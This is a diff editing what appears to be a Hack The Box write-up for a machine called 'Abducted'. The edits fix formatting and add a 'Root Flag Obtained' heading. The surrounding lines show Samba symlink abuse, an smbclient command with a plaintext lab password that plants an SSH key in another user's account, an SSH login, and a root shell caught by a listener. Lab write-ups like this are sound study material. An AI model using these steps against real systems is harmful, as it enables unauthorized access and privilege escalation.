@@ -252,7 +252,6 @@ wide links = Yes
 
 I notice that allow insecure wide links = Yes with the forced user of marcus for the transfer share. Practically, this means that the user Marcus runs the services and can access info beyond this share. This makes sense for a 'transfer' share. Even better, follow symlinks = yes. I might be able to use Scott's shell to set up malicious symlinks that Marcus's process would follow. At this point, I am curious about Marcus and if this is useful or a rabbit trail. I enumerate what Marcus's account can do:
 
-```
 
 ```
 scott@abducted:/var/spool/samba$ echo '=== MARCUS IDENTITY ==='
@@ -332,7 +331,7 @@ I created the key then tried to upload it via smb.
 ➜  Abducted smbclient "//$RHOST/transfer" -U 'scott%iXzvcib3SrpZ' \\n  -c 'mkdir marcushome/.ssh; put marcus_htb.pub marcushome/.ssh/authorized_keys'
 ➜  Abducted chmod 600 ./marcus_htb
 ```
-The attempt was successful and I was able to use ssh to connect as Marcus. I tried to restart teh daemon and was successful.
+The attempt was successful and I was able to use ssh to connect as Marcus. I tried to restart the daemon and was successful.
 
 ```
 ➜  Abducted ssh -i ./marcus_htb -o IdentitiesOnly=yes marcus@"$RHOST"
@@ -343,7 +342,7 @@ Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)
 marcus@abducted:~$ ls
 marcus@abducted:~$ systemctl daemon-reload && systemctl restart smbd.service
 ```
-
+### Root Flag Obtained
 I checked my Penelope listener and found a shell for root.
 
 ```
